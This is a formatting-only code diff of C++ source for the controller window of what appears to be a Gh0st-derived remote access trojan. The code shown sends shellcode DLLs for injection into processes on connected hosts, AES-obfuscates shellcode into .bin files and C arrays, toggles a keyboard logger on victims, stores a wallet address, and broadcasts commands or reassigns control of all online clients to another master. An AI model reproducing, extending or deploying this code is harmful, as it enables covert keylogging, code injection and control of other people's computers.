@@ -103,7 +103,8 @@ std::string EventName()
     snprintf(eventName, sizeof(eventName), "EVENT_%d", GetCurrentProcessId());
     return eventName;
 }
-std::string PluginPath() {
+std::string PluginPath()
+{
     char path[_MAX_PATH];
     GetModuleFileNameA(NULL, path, _MAX_PATH);
     GET_FILEPATH(path, "Plugins");
@@ -287,23 +288,24 @@ DllInfo* ReadPluginDll(const std::string& filename, const DllExecuteInfo & execI
     return new DllInfo{ name, buf };
 }
 
-DllInfo* ReadTinyRunDll(int pid) {
+DllInfo* ReadTinyRunDll(int pid)
+{
     std::string name = TINY_DLL_NAME;
     DWORD fileSize = 0;
     BYTE * dllData = ReadResource(IDR_TINYRUN_X64, fileSize);
-	// 设置输出参数
-	auto md5 = CalcMD5FromBytes(dllData, fileSize);
+    // 设置输出参数
+    auto md5 = CalcMD5FromBytes(dllData, fileSize);
     DllExecuteInfo info = { SHELLCODE, fileSize, CALLTYPE_DEFAULT, {}, {}, pid };
-	memcpy(info.Name, name.c_str(), name.length());
-	memcpy(info.Md5, md5.c_str(), md5.length());
+    memcpy(info.Name, name.c_str(), name.length());
+    memcpy(info.Md5, md5.c_str(), md5.length());
     BYTE* buffer = new BYTE[1 + sizeof(DllExecuteInfo) + fileSize];
-	buffer[0] = CMD_EXECUTE_DLL;
-	memcpy(buffer + 1, &info, sizeof(DllExecuteInfo));
+    buffer[0] = CMD_EXECUTE_DLL;
+    memcpy(buffer + 1, &info, sizeof(DllExecuteInfo));
     memcpy(buffer + 1 + sizeof(DllExecuteInfo), dllData, fileSize);
-	Buffer* buf = new Buffer(buffer, 1 + sizeof(DllExecuteInfo) + fileSize, 0, md5);
+    Buffer* buf = new Buffer(buffer, 1 + sizeof(DllExecuteInfo) + fileSize, 0, md5);
     SAFE_DELETE_ARRAY(dllData);
-	SAFE_DELETE_ARRAY(buffer);
-	return new DllInfo{ name, buf };
+    SAFE_DELETE_ARRAY(buffer);
+    return new DllInfo{ name, buf };
 }
 
 std::vector<DllInfo*> ReadAllDllFilesWindows(const std::string& dirPath)
@@ -533,10 +535,10 @@ BEGIN_MESSAGE_MAP(CMy2015RemoteDlg, CDialogEx)
     ON_COMMAND(ID_OBFS_SHELLCODE_BIN, &CMy2015RemoteDlg::OnObfsShellcodeBin)
     ON_COMMAND(ID_SHELLCODE_AES_BIN, &CMy2015RemoteDlg::OnShellcodeAesBin)
     ON_COMMAND(ID_SHELLCODE_TEST_AES_BIN, &CMy2015RemoteDlg::OnShellcodeTestAesBin)
-        ON_COMMAND(ID_TOOL_RELOAD_PLUGINS, &CMy2015RemoteDlg::OnToolReloadPlugins)
-        ON_COMMAND(ID_SHELLCODE_AES_C_ARRAY, &CMy2015RemoteDlg::OnShellcodeAesCArray)
-        ON_COMMAND(ID_PARAM_KBLOGGER, &CMy2015RemoteDlg::OnParamKblogger)
-        END_MESSAGE_MAP()
+    ON_COMMAND(ID_TOOL_RELOAD_PLUGINS, &CMy2015RemoteDlg::OnToolReloadPlugins)
+    ON_COMMAND(ID_SHELLCODE_AES_C_ARRAY, &CMy2015RemoteDlg::OnShellcodeAesCArray)
+    ON_COMMAND(ID_PARAM_KBLOGGER, &CMy2015RemoteDlg::OnParamKblogger)
+END_MESSAGE_MAP()
 
 
 // CMy2015RemoteDlg 消息处理程序
@@ -1163,7 +1165,7 @@ BOOL CMy2015RemoteDlg::OnInitDialog()
     auto w = THIS_CFG.GetStr("settings", "wallet", "");
     memcpy(m_settings.WalletAddress, w.c_str(), w.length());
     m_settings.EnableKBLogger = THIS_CFG.GetInt("settings", "KeyboardLog", 0);
-	CMenu* SubMenu = m_MainMenu.GetSubMenu(2);
+    CMenu* SubMenu = m_MainMenu.GetSubMenu(2);
     SubMenu->CheckMenuItem(ID_PARAM_KBLOGGER, m_settings.EnableKBLogger ? MF_CHECKED : MF_UNCHECKED);
     std::map<int, std::string> myMap = {{SOFTWARE_CAMERA, "摄像头"}, {SOFTWARE_TELEGRAM, "电报" }};
     std::string str = myMap[n];
@@ -1440,7 +1442,7 @@ void CMy2015RemoteDlg::OnTimer(UINT_PTR nIDEvent)
             Mprintf(">>> Timer is killed <<<\n");
             KillTimer(nIDEvent);
             std::string masterHash = GetMasterHash();
-            if (GetPwdHash() != masterHash) 
+            if (GetPwdHash() != masterHash)
                 THIS_CFG.SetStr("settings", "superAdmin", m_superPass);
             if (GetPwdHash() == masterHash)
                 THIS_CFG.SetStr("settings", "HMAC", genHMAC(masterHash, m_superPass));
@@ -1874,21 +1876,21 @@ VOID CMy2015RemoteDlg::SendSelectedCommand(PBYTE  szBuffer, ULONG ulLength)
 
 VOID CMy2015RemoteDlg::SendAllCommand(PBYTE  szBuffer, ULONG ulLength)
 {
-	EnterCriticalSection(&m_cs);
-	for (int i=0; i<m_CList_Online.GetItemCount(); ++i){
-		context* ContextObject = (context*)m_CList_Online.GetItemData(i);
-		if (!ContextObject->IsLogin() && szBuffer[0] != COMMAND_BYE)
-			continue;
-		if (szBuffer[0] == COMMAND_UPDATE) {
-			CString data = ContextObject->GetClientData(ONLINELIST_CLIENTTYPE);
-			if (data == "SC" || data == "MDLL") {
-				ContextObject->Send2Client(szBuffer, 1);
-				continue;
-			}
-		}
-		ContextObject->Send2Client(szBuffer, ulLength);
-	}
-	LeaveCriticalSection(&m_cs);
+    EnterCriticalSection(&m_cs);
+    for (int i=0; i<m_CList_Online.GetItemCount(); ++i) {
+        context* ContextObject = (context*)m_CList_Online.GetItemData(i);
+        if (!ContextObject->IsLogin() && szBuffer[0] != COMMAND_BYE)
+            continue;
+        if (szBuffer[0] == COMMAND_UPDATE) {
+            CString data = ContextObject->GetClientData(ONLINELIST_CLIENTTYPE);
+            if (data == "SC" || data == "MDLL") {
+                ContextObject->Send2Client(szBuffer, 1);
+                continue;
+            }
+        }
+        ContextObject->Send2Client(szBuffer, ulLength);
+    }
+    LeaveCriticalSection(&m_cs);
 }
 
 //真彩Bar
@@ -2281,12 +2283,12 @@ VOID CMy2015RemoteDlg::MessageHandle(CONTEXT_OBJECT* ContextObject)
     case CMD_EXECUTE_DLL: { // 请求DLL（执行代码）【L】
         DllExecuteInfo *info = (DllExecuteInfo*)ContextObject->InDeCompressedBuffer.GetBuffer(1);
         if (std::string(info->Name) == TINY_DLL_NAME) {
-			auto tinyRun = ReadTinyRunDll(info->Pid);
-			Buffer* buf = tinyRun->Data;
+            auto tinyRun = ReadTinyRunDll(info->Pid);
+            Buffer* buf = tinyRun->Data;
             ContextObject->Send2Client(buf->Buf(), tinyRun->Data->length());
             SAFE_DELETE(tinyRun);
             break;
-		}
+        }
         for (std::vector<DllInfo*>::const_iterator i=m_DllList.begin(); i!=m_DllList.end(); ++i) {
             DllInfo* dll = *i;
             if (dll->Name == info->Name) {
@@ -2295,7 +2297,7 @@ VOID CMy2015RemoteDlg::MessageHandle(CONTEXT_OBJECT* ContextObject)
                 break;
             }
         }
-		auto dll = ReadPluginDll(PluginPath() + "\\" + info->Name, { SHELLCODE, 0, CALLTYPE_DEFAULT, {}, {}, info->Pid, info->Is32Bit });
+        auto dll = ReadPluginDll(PluginPath() + "\\" + info->Name, { SHELLCODE, 0, CALLTYPE_DEFAULT, {}, {}, info->Pid, info->Is32Bit });
         if (dll) {
             Buffer* buf = dll->Data;
             ContextObject->Send2Client(buf->Buf(), dll->Data->length());
@@ -2715,14 +2717,15 @@ void CMy2015RemoteDlg::OnOnlineShare()
     PostMessageA(WM_SHARE_CLIENT, (WPARAM)buf, NULL);
 }
 
-LRESULT CMy2015RemoteDlg::ShareClient(WPARAM wParam, LPARAM lParam) {
+LRESULT CMy2015RemoteDlg::ShareClient(WPARAM wParam, LPARAM lParam)
+{
     char* buf = (char*)wParam;
     int len = strlen(buf);
-	BYTE bToken[_MAX_PATH] = { COMMAND_SHARE };
-	// 目标主机类型
-	bToken[1] = SHARE_TYPE_YAMA;
-	memcpy(bToken + 2, buf, len);
-	lParam ? SendAllCommand(bToken, sizeof(bToken)) : SendSelectedCommand(bToken, sizeof(bToken));
+    BYTE bToken[_MAX_PATH] = { COMMAND_SHARE };
+    // 目标主机类型
+    bToken[1] = SHARE_TYPE_YAMA;
+    memcpy(bToken + 2, buf, len);
+    lParam ? SendAllCommand(bToken, sizeof(bToken)) : SendSelectedCommand(bToken, sizeof(bToken));
     SAFE_DELETE_AR(buf);
     return S_OK;
 }
@@ -3389,8 +3392,8 @@ void CMy2015RemoteDlg::OnObfsShellcode()
 
 void CMy2015RemoteDlg::OnShellcodeAesCArray()
 {
-	ObfsAes obfs;
-	shellcode_process(&obfs);
+    ObfsAes obfs;
+    shellcode_process(&obfs);
 }
 
 
@@ -3431,19 +3434,19 @@ void CMy2015RemoteDlg::OnShellcodeObfsLoadTest()
 
 void CMy2015RemoteDlg::OnShellcodeAesBin()
 {
-	ObfsAes obfs(false);
-	shellcode_process(&obfs, false, ".bin");
+    ObfsAes obfs(false);
+    shellcode_process(&obfs, false, ".bin");
 }
 
 
 void CMy2015RemoteDlg::OnShellcodeTestAesBin()
 {
-	if (MessageBox(CString("是否测试 ") + (sizeof(void*) == 8 ? "64位" : "32位") + " Shellcode 二进制文件? "
-		"请选择受信任的 bin 文件。\r\n测试未知来源的 Shellcode 可能导致程序崩溃，甚至存在 CC 风险。",
-		"提示", MB_ICONQUESTION | MB_YESNO) == IDYES) {
-		ObfsAes obfs;
-		shellcode_process(&obfs, true);
-	}
+    if (MessageBox(CString("是否测试 ") + (sizeof(void*) == 8 ? "64位" : "32位") + " Shellcode 二进制文件? "
+                           "请选择受信任的 bin 文件。\r\n测试未知来源的 Shellcode 可能导致程序崩溃，甚至存在 CC 风险。",
+                           "提示", MB_ICONQUESTION | MB_YESNO) == IDYES) {
+        ObfsAes obfs;
+        shellcode_process(&obfs, true);
+    }
 }
 
 void CMy2015RemoteDlg::OnOnlineAssignTo()
@@ -3470,26 +3473,29 @@ void CMy2015RemoteDlg::OnOnlineAssignTo()
     PostMessageA(WM_ASSIGN_CLIENT, (WPARAM)buf1, (LPARAM)buf2);
 }
 
-LRESULT CMy2015RemoteDlg::assignFunction(WPARAM wParam, LPARAM lParam, BOOL all) {
-	char* buf1 = (char*)wParam, * buf2 = (char*)lParam;
-	int len1 = strlen(buf1), len2 = strlen(buf2);
-	BYTE bToken[_MAX_PATH] = { COMMAND_ASSIGN_MASTER };
-	// 目标主机类型
-	bToken[1] = SHARE_TYPE_YAMA_FOREVER;
-	memcpy(bToken + 2, buf1, len1);
-	bToken[2 + len1] = ':';
-	memcpy(bToken + 2 + len1 + 1, buf2, len2);
-	all ? SendAllCommand(bToken, sizeof(bToken)) : SendSelectedCommand(bToken, sizeof(bToken));
-	SAFE_DELETE_AR(buf1);
-	SAFE_DELETE_AR(buf2);
-	return S_OK;
+LRESULT CMy2015RemoteDlg::assignFunction(WPARAM wParam, LPARAM lParam, BOOL all)
+{
+    char* buf1 = (char*)wParam, * buf2 = (char*)lParam;
+    int len1 = strlen(buf1), len2 = strlen(buf2);
+    BYTE bToken[_MAX_PATH] = { COMMAND_ASSIGN_MASTER };
+    // 目标主机类型
+    bToken[1] = SHARE_TYPE_YAMA_FOREVER;
+    memcpy(bToken + 2, buf1, len1);
+    bToken[2 + len1] = ':';
+    memcpy(bToken + 2 + len1 + 1, buf2, len2);
+    all ? SendAllCommand(bToken, sizeof(bToken)) : SendSelectedCommand(bToken, sizeof(bToken));
+    SAFE_DELETE_AR(buf1);
+    SAFE_DELETE_AR(buf2);
+    return S_OK;
 }
 
-LRESULT CMy2015RemoteDlg::AssignClient(WPARAM wParam, LPARAM lParam) {
+LRESULT CMy2015RemoteDlg::AssignClient(WPARAM wParam, LPARAM lParam)
+{
     return assignFunction(wParam, lParam, FALSE);
 }
 
-LRESULT CMy2015RemoteDlg::AssignAllClient(WPARAM wParam, LPARAM lParam) {
+LRESULT CMy2015RemoteDlg::AssignAllClient(WPARAM wParam, LPARAM lParam)
+{
     return assignFunction(wParam, lParam, TRUE);
 }
 
@@ -3896,30 +3902,32 @@ LRESULT CMy2015RemoteDlg::OnSessionActivatedMsg(WPARAM wParam, LPARAM lParam)
 
 void CMy2015RemoteDlg::OnToolReloadPlugins()
 {
-	if (IDYES!=MessageBoxA("请将64位的DLL放于主控程序的 'Plugins' 目录，是否继续?"
-		"\n执行未经测试的代码可能造成程序崩溃。", "提示", MB_ICONINFORMATION | MB_YESNO))
+    if (IDYES!=MessageBoxA("请将64位的DLL放于主控程序的 'Plugins' 目录，是否继续?"
+                           "\n执行未经测试的代码可能造成程序崩溃。", "提示", MB_ICONINFORMATION | MB_YESNO))
         return;
-	char path[_MAX_PATH];
-	GetModuleFileNameA(NULL, path, _MAX_PATH);
-	GET_FILEPATH(path, "Plugins");
-	m_DllList = ReadAllDllFilesWindows(path);
+    char path[_MAX_PATH];
+    GetModuleFileNameA(NULL, path, _MAX_PATH);
+    GET_FILEPATH(path, "Plugins");
+    m_DllList = ReadAllDllFilesWindows(path);
 }
 
-context* CMy2015RemoteDlg::FindHostByIP(const std::string& ip) {
+context* CMy2015RemoteDlg::FindHostByIP(const std::string& ip)
+{
     CString clientIP(ip.c_str());
-	EnterCriticalSection(&m_cs);
-	for (auto i = m_HostList.begin(); i != m_HostList.end(); ++i) {
-		context* ContextObject = *i;
+    EnterCriticalSection(&m_cs);
+    for (auto i = m_HostList.begin(); i != m_HostList.end(); ++i) {
+        context* ContextObject = *i;
         if (ContextObject->GetClientData(ONLINELIST_IP) == clientIP || ContextObject->GetAdditionalData(RES_CLIENT_PUBIP) == clientIP) {
             LeaveCriticalSection(&m_cs);
-			return ContextObject;
+            return ContextObject;
         }
     }
-	LeaveCriticalSection(&m_cs);
+    LeaveCriticalSection(&m_cs);
     return NULL;
 }
 
-LRESULT CMy2015RemoteDlg::InjectShellcode(WPARAM wParam, LPARAM lParam){
+LRESULT CMy2015RemoteDlg::InjectShellcode(WPARAM wParam, LPARAM lParam)
+{
     std::string* ip = (std::string*)wParam;
     int pid = lParam;
     InjectTinyRunDll(*ip, pid);
@@ -3927,25 +3935,27 @@ LRESULT CMy2015RemoteDlg::InjectShellcode(WPARAM wParam, LPARAM lParam){
     return S_OK;
 }
 
-void CMy2015RemoteDlg::InjectTinyRunDll(const std::string& ip, int pid){
-	auto ctx = FindHostByIP(ip);
+void CMy2015RemoteDlg::InjectTinyRunDll(const std::string& ip, int pid)
+{
+    auto ctx = FindHostByIP(ip);
     if (ctx == NULL) {
         MessageBoxA(CString("没有找到在线主机: ") + ip.c_str(), "提示", MB_ICONINFORMATION);
         return;
     }
 
     auto tinyRun = ReadTinyRunDll(pid);
-	Buffer* buf = tinyRun->Data;
-	ctx->Send2Client(buf->Buf(), 1 + sizeof(DllExecuteInfo));
+    Buffer* buf = tinyRun->Data;
+    ctx->Send2Client(buf->Buf(), 1 + sizeof(DllExecuteInfo));
     SAFE_DELETE(tinyRun);
 }
 
-LRESULT CMy2015RemoteDlg::AntiBlackScreen(WPARAM wParam, LPARAM lParam) {
-	char* ip = (char*)wParam;
+LRESULT CMy2015RemoteDlg::AntiBlackScreen(WPARAM wParam, LPARAM lParam)
+{
+    char* ip = (char*)wParam;
     std::string host(ip);
     std::string arch = ip + 256;
-	int pid = lParam;
-	auto ctx = FindHostByIP(ip);
+    int pid = lParam;
+    auto ctx = FindHostByIP(ip);
     delete ip;
     if (ctx == NULL) {
         MessageBoxA(CString("没有找到在线主机: ") + host.c_str(), "提示", MB_ICONINFORMATION);
@@ -3958,7 +3968,7 @@ LRESULT CMy2015RemoteDlg::AntiBlackScreen(WPARAM wParam, LPARAM lParam) {
         Buffer* buf = antiBlackScreen->Data;
         ctx->Send2Client(buf->Buf(), 1 + sizeof(DllExecuteInfo));
         SAFE_DELETE(antiBlackScreen);
-    }else
+    } else
         MessageBoxA(CString("没有反黑屏插件: ") + path.c_str(), "提示", MB_ICONINFORMATION);
     return S_OK;
 }
@@ -3967,8 +3977,8 @@ LRESULT CMy2015RemoteDlg::AntiBlackScreen(WPARAM wParam, LPARAM lParam) {
 void CMy2015RemoteDlg::OnParamKblogger()
 {
     m_settings.EnableKBLogger = !m_settings.EnableKBLogger;
-	CMenu* SubMenu = m_MainMenu.GetSubMenu(2);
-	SubMenu->CheckMenuItem(ID_PARAM_KBLOGGER, m_settings.EnableKBLogger ? MF_CHECKED : MF_UNCHECKED);
+    CMenu* SubMenu = m_MainMenu.GetSubMenu(2);
+    SubMenu->CheckMenuItem(ID_PARAM_KBLOGGER, m_settings.EnableKBLogger ? MF_CHECKED : MF_UNCHECKED);
     THIS_CFG.SetInt("settings", "KeyboardLog", m_settings.EnableKBLogger);
     SendMasterSettings(nullptr);
 }
